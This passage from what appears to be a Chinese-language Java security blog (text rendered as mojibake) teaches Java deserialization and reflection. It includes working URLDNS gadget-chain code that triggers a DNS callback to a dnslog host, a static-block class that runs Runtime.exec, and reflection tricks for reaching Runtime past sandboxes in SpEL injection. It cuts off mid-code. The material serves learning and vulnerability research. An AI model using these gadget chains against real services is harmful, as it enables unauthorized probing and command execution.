"></a>1.å¤ç°ä»£ç </h3><ul><li><p><strong>persion.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">()</span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// æ„é€ å‡½æ•°</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">(String name, <span class="type">int</span> age)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Person&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;name=&#x27;&quot;</span> + name + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, age=&quot;</span> + age +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p><strong>SerializationTest.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SerializationTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException&#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;aa&quot;</span>,<span class="number">22</span>);</span><br><span class="line">        System.out.println(person);</span><br><span class="line">        serialize(person);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p><strong>UnserializeTest.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UnserializeTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException&#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> (Person)unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">        System.out.println(person);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h3 id="2-ååºåˆ—åŒ–æ¼æ´æˆå› "><a href="#2-ååºåˆ—åŒ–æ¼æ´æˆå› " class="headerlink" title="2.ååºåˆ—åŒ–æ¼æ´æˆå› "></a>2.ååºåˆ—åŒ–æ¼æ´æˆå› </h3><ul><li><strong>åœ¨è¿›è¡Œååºåˆ—åŒ–æ—¶ï¼Œä¼šè°ƒç”¨è¢«ååºåˆ—åŒ–ä¸»å‡½æ•°è€Œè¿™ä¸ªå‡½æ•°ä¸€èˆ¬éƒ½ä¸ºç¨‹åºå‘˜è‡ªè¡Œæ”¹å†™çš„readObjectå‡½æ•°</strong></li><li><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202512312318942.png" alt="image-20251212222249115"></li></ul><h3 id="3-å¸¸è§å½¢å¼"><a href="#3-å¸¸è§å½¢å¼" class="headerlink" title="3.å¸¸è§å½¢å¼"></a>3.å¸¸è§å½¢å¼</h3><ul><li><p>å…¥å£ç±»çš„ <code>readObject</code> ç›´æ¥è°ƒç”¨å±é™©æ–¹æ³•</p><p><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202512312318837.png" alt="image-20251212222733856"></p></li><li><p>å…¥å£å‚æ•°ä¸­åŒ…å«å¯æ§ç±»ï¼Œè¯¥ç±»æœ‰å±é™©æ–¹æ³•ï¼Œ<code>readObject</code> æ—¶è°ƒç”¨</p></li><li><p>å…¥å£ç±»å‚æ•°ä¸­åŒ…å«å¯æ§ç±»ï¼Œè¯¥ç±»åˆè°ƒç”¨å…¶ä»–æœ‰å±é™©æ–¹æ³•çš„ç±»</p></li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">å…¥å£ç±»ï¼šsource ï¼ˆé‡å†™ readObject è°ƒç”¨å¸¸è§çš„å‡½æ•°ï¼›å‚æ•°ç±»å‹å®½æ³›ï¼Œæ¯”å¦‚å¯ä»¥ä¼ å…¥ä¸€ä¸ªç±»ä½œä¸ºå‚æ•°ï¼›æœ€å¥½ jdk è‡ªå¸¦ï¼‰ </span><br><span class="line">æ‰¾åˆ°å…¥å£ç±»ä¹‹åè¦æ‰¾è°ƒç”¨é“¾ gadget chain ç›¸åŒåç§°ã€ç›¸åŒç±»å‹ </span><br><span class="line">æ‰§è¡Œç±» sink ï¼ˆRCE SSRF å†™æ–‡ä»¶ç­‰ç­‰ï¼‰æ¯”å¦‚ exec è¿™ç§å‡½æ•°</span><br></pre></td></tr></table></figure><h3 id="4-å¸¸è§é“¾dnslogåˆ†æ"><a href="#4-å¸¸è§é“¾dnslogåˆ†æ" class="headerlink" title="4.å¸¸è§é“¾dnslogåˆ†æ"></a>4.å¸¸è§é“¾<code>dnslog</code>åˆ†æ</h3><ul><li><p><strong>å¯»æ‰¾å…¥å£ç‚¹</strong></p><p><code>HashMap</code>ä¸­é‡å†™äº†<code>readObject</code>æ–¹æ³•</p><p><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202512312319084.png" alt="image-20251213152124264"></p><p>è€Œè¯¥æ–¹æ³•åˆè°ƒç”¨äº†<code>hash</code>æ–¹æ³•</p><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202512312319388.png" alt="image-20251213152244895" style="zoom:50%;" /><p><code>hash</code>æ–¹æ³•å†…éƒ¨è°ƒç”¨objectç±»æ–¹æ³•ä¸­<code>hashcode</code>æ–¹æ³•ï¼Œè€Œè¯¥æ–¹æ³•è¢«è®¸å¤šç±»é‡å†™ï¼Œä»è€Œå¯¼è‡´å¯åˆ©ç”¨æ¼æ´</p><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202512312319121.png" alt="image-20251213152323215" style="zoom: 67%;" /></li><li><p><strong>å¯»æ‰¾å¯åˆ©ç”¨ç±»</strong></p><p>æˆ‘ä»¬å‘ç°URLç±»ä¸­é‡å†™äº†<code>hashcode</code>å‡½æ•°</p><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202601010945198.png" alt="image-20251213152544904" style="zoom:50%;" /><p>è€Œè¯¥å‡½æ•°è°ƒç”¨äº†æŠ½è±¡ç±»<code>URLStreamHandler</code>ä¸­<code>hashCode</code>æ–¹æ³•</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">transient</span> URLStreamHandler handler;</span><br></pre></td></tr></table></figure><p>è¯¥æ–¹æ³•å­˜åœ¨è§£ææœåŠ¡å™¨åœ°å€ï¼Œå³<code>dns</code>è¯·æ±‚</p><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202512312319657.png" alt="image-20251213152818539" style="zoom:50%;" /></li><li><p><strong>å°è¯•åˆ©ç”¨</strong></p><p>æ•…å› æ­¤æˆ‘ä»¬å°è¯•åˆ©ç”¨è¯¥é“¾å®ç°<code>dnslog</code>æ¢æµ‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//åå°„è·å–URLç±»çš„hashCodeå­—æ®µ</span></span><br><span class="line"><span class="type">Class</span> <span class="variable">URLClass</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.net.URL&quot;</span>);</span><br><span class="line"><span class="type">Field</span> <span class="variable">hashCode</span> <span class="operator">=</span> URLClass.getDeclaredField(<span class="string">&quot;hashCode&quot;</span>);</span><br><span class="line">hashCode.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">Map&lt;URL,Integer&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line"><span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;https://3b6hft.dnslog.cn&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//å°†hashCodeå­—æ®µå€¼è®¾ç½®ä¸º1234ï¼Œä»è€Œä¸ä¼šè§¦å‘putæ—¶çš„hashCodeè®¡ç®—</span></span><br><span class="line">hashCode.set(url,<span class="number">1234</span>);</span><br><span class="line"></span><br><span class="line">map.put(url,<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//putå®Œæˆä¹‹åè®¾ç½®å…¶å€¼ä¸º-1ï¼Œä»è€Œå¯¼è‡´ä¹‹åååºåˆ—åŒ–æ—¶è§¦å‘hashCodeè®¡ç®—</span></span><br><span class="line">hashCode.set(url,-<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">serialize(map);</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202512312319473.png" alt="image-20251213154714102"></p></li></ul><h3 id="4-â€ç¨‹å’¬é‡‘â€"><a href="#4-â€ç¨‹å’¬é‡‘â€" class="headerlink" title="4.â€ç¨‹å’¬é‡‘â€"></a>4.â€ç¨‹å’¬é‡‘â€</h3><p>æˆ‘ä»¬åœ¨åˆ©ç”¨æ—¶é‡åˆ°ä¸€äº›é—®é¢˜ï¼Œå¦‚ä¸‹ï¼š</p><ul><li><p><code>map.put(url,1);</code>è¿™ä¸ªæ–¹æ³•åœ¨putæ—¶ï¼Œè°ƒç”¨äº†hashå‡½æ•°</p><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202512312319737.png" alt="image-20251213155052808" style="zoom: 50%;" /><p>è¿›è€Œè®¡ç®—<code>hashcode</code>å€¼ï¼Œæ”¹å˜äº†URLç±»ä¸‹<code>hashcode</code>çš„å€¼ï¼Œå¹¶è°ƒç”¨æŠ½è±¡ç±»<code>URLStreamHandler</code>ä¸­<code>hashCode</code>æ–¹æ³•ï¼Œå‘èµ·ä¸€æ¬¡dnsè¯·æ±‚</p><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202512312319798.png" alt="image-20251213155345530" style="zoom: 67%;" /><p><strong>å¹²æ‰°äº†dnslogåˆ©ç”¨æ¢æµ‹ï¼Œåœ¨åºåˆ—åŒ–ä¹‹å‰å°±å‘ç”Ÿäº†dnslogè§£æ</strong></p></li><li><p>ç”±äºè¢«<code>map.put(url,1);</code>æ–¹æ³•æŠ¢å…ˆè°ƒç”¨hashcodeè§£æè¯·æ±‚ï¼Œå¯¼è‡´åœ¨ååºåˆ—åŒ–æ–‡æœ¬å­—èŠ‚æµæ—¶ï¼Œhashcodeå€¼æ—©å·²ä¸æ˜¯-1ï¼Œä»è€Œä¸ä¼šè°ƒç”¨æŠ½è±¡ç±»<code>URLStreamHandler</code>ä¸­<code>hashCode</code>æ–¹æ³•ï¼Œå‘èµ·dnsè¯·æ±‚</p><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202512312319136.png" alt="image-20251213155809529" style="zoom: 50%;" /><p>å³è¿›å…¥ä¸‹å›¾ä¸Šæ–¹ifè¯­å¥åˆ¤æ–­ï¼Œä¸åœ¨å‘èµ·dnsè¯·æ±‚</p></li></ul><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202512312318120.png" alt="image-20251213155906394" style="zoom: 67%;" /><p><strong>äºæ˜¯ï¼Œæˆ‘ä»¬åˆ©ç”¨åå°„ç»•è¿‡é€»è¾‘</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//åå°„è·å–URLç±»çš„hashCodeå­—æ®µ</span></span><br><span class="line"><span class="type">Class</span> <span class="variable">URLClass</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.net.URL&quot;</span>);</span><br><span class="line"><span class="type">Field</span> <span class="variable">hashCode</span> <span class="operator">=</span> URLClass.getDeclaredField(<span class="string">&quot;hashCode&quot;</span>);</span><br><span class="line">hashCode.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">Map&lt;URL,Integer&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line"><span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;https://tyws4h.dnslog.cn&quot;</span>);</span><br><span class="line"><span class="comment">//å°†hashCodeå­—æ®µå€¼è®¾ç½®ä¸º1234ï¼Œä»è€Œä¸ä¼šè§¦å‘putæ—¶çš„hashCodeè®¡ç®—</span></span><br><span class="line">hashCode.set(url,<span class="number">1234</span>);</span><br><span class="line">map.put(url,<span class="number">1</span>);</span><br><span class="line"><span class="comment">//putå®Œæˆä¹‹åè®¾ç½®å…¶å€¼ä¸º-1ï¼Œä»è€Œå¯¼è‡´ä¹‹åååºåˆ—åŒ–æ—¶è§¦å‘hashCodeè®¡ç®—</span></span><br><span class="line">hashCode.set(url,-<span class="number">1</span>);</span><br><span class="line">serialize(map);</span><br></pre></td></tr></table></figure><p>ç”±æ­¤ï¼Œå®ç°æˆ‘ä»¬æœ€ç»ˆæ•ˆæœï¼Œåªæœ‰åœ¨ååºåˆ—åŒ–å­—èŠ‚æµæ—¶ï¼Œè§¦å‘<code>dnslog</code>è¯·æ±‚</p><p><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202512312319041.png" alt="image-20251213160830573"></p>]]></content>
      
      
      <categories>
          
          <category> javaå®‰å…¨ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> javaå®‰å…¨ </tag>
            
            <tag> ååºåˆ—åŒ– </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>javaå®‰å…¨-åå°„</title>
      <link href="/2025/12/13/fanshe/"/>
      <url>/2025/12/13/fanshe/</url>
      
        <content type="html"><![CDATA[<h1 id="javaå®‰å…¨-åå°„"><a href="#javaå®‰å…¨-åå°„" class="headerlink" title="javaå®‰å…¨-åå°„"></a>javaå®‰å…¨-åå°„</h1><h2 id="ä¸€ã€ä»€ä¹ˆæ˜¯åå°„ï¼Ÿ"><a href="#ä¸€ã€ä»€ä¹ˆæ˜¯åå°„ï¼Ÿ" class="headerlink" title="ä¸€ã€ä»€ä¹ˆæ˜¯åå°„ï¼Ÿ"></a>ä¸€ã€ä»€ä¹ˆæ˜¯åå°„ï¼Ÿ</h2><p><strong>ä¸€æ®µä»£ç ï¼Œæ”¹å˜å…¶ä¸­çš„å˜é‡ï¥¾ï¼Œå°†ä¼šå¯¼è‡´è¿™æ®µä»£ç äº§â½£ç”ŸåŠŸèƒ½æ€§çš„å˜åŒ–ï¼Œæˆ‘ç§°ä¹‹ä¸ºåŠ¨æ€ç‰¹æ€§ã€‚</strong></p><p><strong>æ¯”å¦‚è¯´</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">execute</span><span class="params">(String className, String methodName)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(className);</span><br><span class="line">clazz.getMethod(methodName).invoke(clazz.newInstance());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨ä½ ä¸çŸ¥é“ä¼ å…¥çš„å‚æ•°å€¼çš„æ—¶å€™ï¼Œä½ æ˜¯ï¥§çŸ¥é“ä»–çš„ä½œâ½¤æ˜¯å¹²ï§½ä¹ˆçš„</p><p>åœ¨å®‰å…¨ç ”ç©¶ä¸­ï¼Œæˆ‘ä»¬ä½¿â½¤ç”¨åå°„çš„â¼€â¼¤â½¬çš„ï¼Œå°±æ˜¯ç»•è¿‡æŸäº›æ²™ç›’ã€‚æ¯”å¦‚ï¼Œä¸Šä¸‹æ–‡ä¸­å¦‚æœåªæœ‰Integerç±»å‹çš„æ•°å­—ï¼Œæˆ‘ä»¬å¦‚ä½•è·å–åˆ°å¯ä»¥æ‰§ï¨ˆå‘½ä»¤çš„Runtimeç±»å‘¢ï¼Ÿä¹Ÿè®¸å¯ä»¥è¿™æ ·ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span>getClass().forName(<span class="string">&quot;java.lang.Runtime&quot;</span>)</span><br></pre></td></tr></table></figure><h2 id="äºŒã€åå°„å¸¸ç”¨å‡½æ•°"><a href="#äºŒã€åå°„å¸¸ç”¨å‡½æ•°" class="headerlink" title="äºŒã€åå°„å¸¸ç”¨å‡½æ•°"></a>äºŒã€åå°„å¸¸ç”¨å‡½æ•°</h2><h3 id="1-forName"><a href="#1-forName" class="headerlink" title="1.forName"></a>1.<code>forName</code></h3><p><code>Class.forName</code> å¦‚æœä½ çŸ¥é“æŸä¸ªç±»çš„åå­—ï¼Œæƒ³è·å–åˆ°è¿™ä¸ªç±»ï¼Œå°±å¯ä»¥ä½¿â½¤ç”¨<code> forName</code>æ¥è·å–ã€‚</p><p><code>forname</code>æ–¹æ³•æœ‰å¤šä¸ªæ–¹æ³•é‡è½½ï¼Œæ ¹æ®å‚æ•°å¯åˆ†ä¸º</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Class&lt;?&gt; forName(String name)</span><br><span class="line">Class&lt;?&gt; forName(String name, boolean initialize, ClassLoader loader)</span><br><span class="line">ç¬¬ä¸€ä¸ªå®ç°ç­‰ä»·äº`Class.forName(className, true, currentClassLoader);`</span><br></pre></td></tr></table></figure><ul><li><p><strong>å‚æ•°è¯´æ˜ï¼š</strong></p><ul><li><p>nameï¼šç±»åï¼Œå¦‚ <code>&quot;java.lang.Integer&quot;</code></p></li><li><p>initializeï¼š</p><ul><li><code>true</code>ï¼šåŠ è½½ + é“¾æ¥ + åˆå§‹åŒ–ï¼ˆæ‰§è¡Œ static å—ï¼‰</li><li><code>false</code>ï¼šåªåŠ è½½ï¼Œä¸æ‰§è¡Œ static å—</li></ul></li><li><p>loaderï¼šæŒ‡å®šç±»åŠ è½½å™¨</p></li></ul></li></ul><p>â€‹ç±»åŠ è½½ â‰  åˆ›å»ºå¯¹è±¡ï¼›åªæœ‰åˆ›å»ºå¯¹è±¡æ‰ä¼šè°ƒç”¨æ„é€ æ–¹æ³•ï¼Œæ­¤æ—¶æœªè°ƒç”¨æ„é€ æ–¹æ³•ã€‚</p><ul><li><p><strong>ç±»çš„ä¸‰ç§åˆå§‹åŒ–æ–¹å¼</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TrainPrint</span> &#123;</span><br><span class="line">    &#123;                               <span class="comment">// â‘  å®ä¾‹åˆå§‹åŒ–å—ï¼ˆInstance Initializer Blockï¼‰</span></span><br><span class="line">        System.out.printf(<span class="string">&quot;Empty block initial %s\n&quot;</span>, <span class="built_in">this</span>.getClass());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> &#123;                        <span class="comment">// â‘¡ é™æ€åˆå§‹åŒ–å—ï¼ˆStatic Initializer Blockï¼‰</span></span><br><span class="line">        System.out.printf(<span class="string">&quot;Static initial %s\n&quot;</span>, TrainPrint.class);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">TrainPrint</span><span class="params">()</span> &#123;           <span class="comment">// â‘¢ æ„é€ æ–¹æ³•ï¼ˆConstructorï¼‰</span></span><br><span class="line">        System.out.printf(<span class="string">&quot;Initial %s\n&quot;</span>, <span class="built_in">this</span>.getClass());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨<code>forname</code>åªä¼šè°ƒç”¨<strong>staticå³é™æ€åˆå§‹åŒ–å—</strong>ï¼Œå…¶åœ¨<strong>ç±»è¢«åŠ è½½ï¼ˆåˆå§‹åŒ–ï¼‰æ—¶æ‰§è¡Œ</strong></p><p>å› æ­¤å¯ä»¥åœ¨æ¶æ„ç±»ä¸­staticåŠ å…¥æ¶æ„ä»£ç ï¼Œä»è€Œæ‰§è¡Œ</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">ä¾‹å¦‚ï¼š</span><br><span class="line">import java.lang.Runtime;</span><br><span class="line">import java.lang.Process;</span><br><span class="line">public class TouchFile &#123;</span><br><span class="line">    static &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            Runtime rt = Runtime.getRuntime();</span><br><span class="line">            String[] commands = &#123;&quot;touch&quot;, &quot;/tmp/success&quot;&#125;;</span><br><span class="line">            Process pc = rt.exec(commands);</span><br><span class="line">            pc.waitFor();</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            // do nothing</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p><strong>å®ç°æ²™ç®±ç»•è¿‡</strong></p><p><code> 1.getClass().forName(&quot;java.lang.Runtime&quot;)</code>è¯¦è§£</p><p><strong>æœ¬è´¨å°±æ˜¯classç±»ä¸­æœ‰é™æ€æ–¹æ³•<code>forname</code>ï¼Œæ‰€ä»¥å…ˆé€šè¿‡<code>getClass</code>è·å–<code>integer</code>ç±»å¯¹è±¡ï¼Œè¿›è€Œè·å–Runtimeå¯¹è±¡</strong></p></li></ul><p>â€‹åœ¨SPELæ³¨å…¥ä¸­å¸¸é‡åˆ°</p><ul><li><p><strong>å†…éƒ¨ç±»åŠ è½½</strong></p><p>é™æ€å†…éƒ¨ç±»ä¸ä¾èµ–å¤–éƒ¨ç±»å®ä¾‹ï¼Œå¯ä»¥ç›´æ¥é€šè¿‡ <code>Class.forName</code>ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Class&lt;?&gt; clazz = Class.forName(&quot;C1$C2&quot;);        //åŠ è½½ç±»</span><br><span class="line">Object obj = clazz.getDeclaredConstructor().newInstance();     //c</span><br></pre></td></tr></table></figure></li></ul><h3 id="2-getMethodä¸invoke"><a href="#2-getMethodä¸invoke" class="headerlink" title="2.getMethodä¸invoke"></a>2.<code>getMethod</code>ä¸<code>invoke</code></h3><p><strong><code>getMethod</code></strong> çš„ä½œç”¨æ˜¯é€šè¿‡åå°„è·å–ä¸€ä¸ªç±»çš„æŸä¸ªç‰¹å®šçš„å…¬æœ‰æ–¹æ³•ã€‚</p><p>å‚æ•°ä¸ºæ–¹æ³•å‚æ•°åˆ—è¡¨ç±»ï¼Œ<code>Method m = cls.getMethod(&quot;greet&quot;, String.class, int.class);</code></p><p>å¯ä»¥åŠ å…¥declaredè¿›è¡Œè·å–ç§æœ‰æ–¹æ³•</p><p>**<code>invoke</code>**çš„ä½œç”¨æ˜¯æ‰§è¡Œå‡½æ•°ã€‚</p><ul><li><p>å‚æ•°è¯¦è§£ï¼Œ<code>method.invoke(obj, 123, &quot;abc&quot;);</code></p><ul><li><code>obj</code>ï¼šè¦è°ƒç”¨çš„<strong>æ–¹æ³•æ‰€å±å¯¹è±¡å®ä¾‹</strong>ï¼›<ul><li>å¯¹äº <strong>å®ä¾‹æ–¹æ³•</strong>ï¼šå¿…é¡»ä¼ è¯¥ç±»çš„ä¸€ä¸ªå¯¹è±¡å®ä¾‹</li><li>å¯¹äº <strong>é™æ€æ–¹æ³•</strong>ï¼šå¯ä»¥ä¼  <code>null</code>æˆ–ä»»æ„å®ä¾‹</li></ul></li><li><code>args</code>ï¼šå‚æ•°åˆ—è¡¨ï¼ˆå¿…é¡»ä¸æ–¹æ³•å‚æ•°ç±»å‹<strong>ä¸€ä¸€å¯¹åº”</strong>ï¼‰</li></ul><p>è¿”å›å€¼ï¼š</p><ul><li>è¿”å›è¯¥æ–¹æ³•çš„è¿”å›ç»“æœï¼Œç±»å‹ä¸º <code>Object</code></li><li>æ–¹æ³•è¿”å› <code>void</code> æ—¶ç»“æœæ˜¯ <code>null</code></li></ul></li></ul><p><strong>ä½¿ç”¨è¯¥æ–¹æ³•è¿›è¡ŒRuntimeåå°„</strong></p><ul><li><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line"><span class="type">Method</span> <span class="variable">execMethod</span> <span class="operator">=</span> clazz.getMethod(<span class="string">&quot;exec&quot;</span>,String.class);</span><br><span class="line"><span class="type">Method</span> <span class="variable">getRuntimeMethod</span> <span class="operator">=</span> clazz.getMethod(<span class="string">&quot;getRuntime&quot;</span>);</span><br><span class="line"><span class="type">Runtime</span> <span class="variable">runtime</span> <span class="operator">=</span> 